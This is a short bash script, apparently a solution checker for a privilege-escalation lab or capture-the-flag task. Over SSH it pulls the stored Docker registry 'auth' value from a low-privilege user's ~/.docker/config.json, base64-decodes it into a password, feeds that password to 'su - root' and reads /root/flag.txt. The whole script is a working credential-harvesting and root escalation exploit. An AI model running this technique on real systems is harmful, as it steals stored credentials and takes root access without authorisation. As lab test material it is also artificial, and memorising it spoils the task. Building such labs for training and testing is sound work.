#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
AUTH=$(grep -o "\"auth\":\"[^\"]*\"" /home/lowpriv/.docker/config.json | head -1 | cut -d\" -f4)
PASS=$(printf "%s" "$AUTH" | base64 -d | cut -d: -f2-)
printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
